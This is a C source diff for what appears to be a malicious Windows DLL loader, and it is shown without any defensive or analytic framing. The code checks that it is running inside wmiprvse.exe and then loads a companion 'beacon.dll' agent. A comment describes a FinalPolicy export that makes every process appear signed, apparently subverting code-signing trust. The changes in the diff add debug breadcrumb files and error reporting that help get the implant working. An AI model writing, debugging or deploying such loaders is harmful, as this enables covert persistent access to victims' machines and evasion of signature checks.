@@ -31,6 +31,29 @@
 #define BEACON_NAME "beacon.dll"
 #endif
 
+/* Debug: write a breadcrumb file to see how far we get */
+#ifdef TMB_DEBUG
+static void breadcrumb(const char *name, const char *msg) {
+    char path[MAX_PATH];
+    int i = 0;
+    const char *prefix = "C:\\Windows\\Temp\\tmb_";
+    while (*prefix) path[i++] = *prefix++;
+    while (*name) path[i++] = *name++;
+    const char *ext = ".txt";
+    while (*ext) path[i++] = *ext++;
+    path[i] = 0;
+
+    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(hf, msg, lstrlenA(msg), &w, NULL);
+        CloseHandle(hf);
+    }
+}
+#else
+#define breadcrumb(n, m)
+#endif
+
 static volatile LONG g_ran = 0;
 
 /* ponytail: case-insensitive substring match without CRT */
@@ -56,7 +79,13 @@ static void load_beacon(HMODULE hSelf) {
     /* Check if we're inside wmiprvse.exe */
     char proc[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, proc, MAX_PATH);
-    if (!contains_ci(proc, "wmiprvse")) return;
+    breadcrumb("1_loaded", proc);
+
+    if (!contains_ci(proc, "wmiprvse")) {
+        breadcrumb("2_skip", proc);
+        return;
+    }
+    breadcrumb("2_wmiprvse", "yes");
 
     /* Build beacon path: same directory as this DLL + BEACON_NAME */
     char self[MAX_PATH] = {0};
@@ -73,8 +102,25 @@ static void load_beacon(HMODULE hSelf) {
     while (*bn) *last++ = *bn++;
     *last = '\0';
 
+    breadcrumb("3_loading", self);
+
     /* Load beacon DLL -- DllMain fires, agent starts */
-    LoadLibraryA(self);
+    HMODULE hBeacon = LoadLibraryA(self);
+    if (hBeacon) {
+        breadcrumb("4_success", self);
+    } else {
+        char err[32];
+        DWORD e = GetLastError();
+        /* manual itoa since no CRT */
+        int pos = 0;
+        err[pos++] = 'e'; err[pos++] = 'r'; err[pos++] = 'r'; err[pos++] = '=';
+        DWORD tmp = e;
+        char digits[10]; int dc = 0;
+        do { digits[dc++] = '0' + (tmp % 10); tmp /= 10; } while (tmp);
+        while (dc > 0) err[pos++] = digits[--dc];
+        err[pos] = 0;
+        breadcrumb("4_failed", err);
+    }
 }
 
 /* FinalPolicy export: returns S_OK for all processes (everything appears signed).
